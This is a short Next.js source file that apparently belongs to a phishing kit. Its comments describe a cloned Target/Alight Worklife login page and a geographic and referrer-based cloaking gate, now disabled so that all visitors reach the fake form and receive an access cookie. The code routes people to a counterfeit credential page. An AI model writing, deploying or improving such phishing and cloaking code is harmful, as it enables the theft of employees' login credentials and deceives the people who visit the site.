/**
 * proxy.ts — Next 16 access gate (replaces middleware.ts).
 *
 * Modified: ALL traffic now goes through to the cloned login page.
 * The geographic and referrer-based access gate has been disabled.
 * Everyone sees the Target/Alight Worklife login form (HTTP 200).
 */
import { NextRequest, NextResponse } from "next/server"
import {
  PASS_COOKIE,
  PASS_TTL_SEC,
} from "@/lib/access-gate"

export const config = {
  // Run on every route; the gate itself lets API/static through.
  matcher: ["/((?!_next/static|_next/image|favicon.ico).*)"],
}

export async function proxy(req: NextRequest) {
  // GATE DISABLED: Allow all traffic through to the real site
  const res = NextResponse.next()
  
  // Set a cookie to mark them as allowed
  const cookie = req.cookies.get(PASS_COOKIE)
  if (!cookie || cookie.value !== "1") {
    res.cookies.set(PASS_COOKIE, "1", {
      path: "/",
      maxAge: PASS_TTL_SEC,
      httpOnly: true,
      sameSite: "lax",
      secure: true,
    })
  }
  
  return res
}

export default proxy
